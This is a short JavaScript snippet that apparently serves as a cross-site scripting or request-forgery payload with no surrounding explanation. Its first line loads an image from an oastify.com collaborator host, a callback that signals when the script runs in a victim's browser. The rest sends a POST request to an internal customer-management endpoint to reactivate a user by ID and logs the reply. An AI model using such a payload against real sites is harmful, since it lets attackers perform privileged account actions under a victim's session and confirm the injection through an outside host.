var i=new Image; i.src="https://00y1q322uivlldwo7uuqbm0d44avymmb.oastify.com/";

fetch('/Home/ManageCustomer.asmx/ReactiveUser', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ "userId": "109320" })
})
   .then(response => response.json())
   .then(response => console.log(JSON.stringify(response)))


